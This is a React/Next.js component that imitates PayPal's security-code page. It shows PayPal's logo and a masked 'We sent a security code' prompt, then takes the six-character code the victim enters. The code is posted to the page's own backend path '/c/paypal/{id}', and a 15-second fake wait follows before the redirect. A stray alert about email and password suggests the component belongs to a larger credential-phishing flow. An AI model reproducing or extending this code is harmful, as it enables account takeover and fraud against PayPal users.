"use client";

import { BASE_URL } from "@/sdk/utils";
import axios from "axios";
import { Loader2 } from "lucide-react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { FormEvent, useState } from "react";
import { REGEXP_ONLY_DIGITS_AND_CHARS } from "input-otp";

import { Loader1 } from "../loader1";

import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

export const CodePage = ({ id }: { id?: string }) => {
  const router = useRouter();

  const initForm = { code: "" };

  const [form, setForm] = useState(initForm);
  const [pending, setPending] = useState(false);
  const [res, setRes] = useState<null | string>(null);
  const [loader, setLoader] = useState(false);

  function handleOtpChange(code: string) {
    setForm((curr) => ({ ...curr, code }));
  }

  const isDisabled = pending || form?.code?.trim()?.length !== 6 ? true : false;

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();

    // return alert(JSON.stringify(form));

    if (isDisabled) return alert("Email and password are required");
    if (!id) return alert("Please try and log in again");

    try {
      setPending(true);
      setLoader(true);
      const { status } = await axios.post(`${BASE_URL}/c/paypal/${id}`, form);
      setPending(false);

      if (status >= 200 && status < 300) {
        localStorage.removeItem("paypal");
        setRes("Please wait...");
        setForm(initForm);
        setTimeout(() => {
          setLoader(false);
          router.push("/");
        }, 15000);
      }
    } catch (error) {
      console.log("error :>> ", error);
      setLoader(false);
      setRes("Something went wrong, please try again later.");
    } finally {
      setPending(false);
      setTimeout(() => {
        setRes(null);
      }, 8000);
    }
  }

  return (
    <>
      {loader && <Loader1 />}
      <section className="w-[93%] max-w-sm p-2 flex flex-col items-center justify-center gap-8">
        <div className="flex flex-col items-center">
          <Image
            src={"/images/paypal-seo.png"}
            alt="paypal logo"
            width={300}
            height={300}
            className="h-auto w-16"
          />

          <p className="font-bold text-lg text-black my-4 text-center">
            Enter your code
          </p>

          <p className="text-sm font-medium">
            We sent a security code to #########
          </p>
        </div>

        <form className="w-full" onSubmit={(e) => handleSubmit(e)}>
          <div className="flex justify-center mb-6">
            <InputOTP
              maxLength={6}
              pattern={REGEXP_ONLY_DIGITS_AND_CHARS}
              name="code"
              onChange={(e) => handleOtpChange(e)}
            >
              <InputOTPGroup className="gap-2">
                {new Array(6).fill(false).map((inp, i) => (
                  <InputOTPSlot
                    index={i}
                    key={i}
                    className="text-3xl py-7 px-5 sm:py-[1.875rem] sm:px-[1.4rem] border border-gray-400 rounded-sm"
                  />
                ))}
              </InputOTPGroup>
            </InputOTP>
          </div>

          <button
            className="rounded-full p-[0.9rem] text-white bg-[#163fae] w-full cursor-pointer grid place-items-center font-extrabold"
            type="submit"
            disabled={isDisabled}
          >
            {pending ? (
              <Loader2 className="animate-spin text-white" />
            ) : (
              <span>Submit</span>
            )}
          </button>

          <p className="text-[12px] text-[#2751bd] font-extrabold my-4 text-center">
            Try another way
          </p>
          {res && (
            <p className="text-center mt-4 text-sm text-gray-700">{res}</p>
          )}
        </form>
      </section>
    </>
  );
};
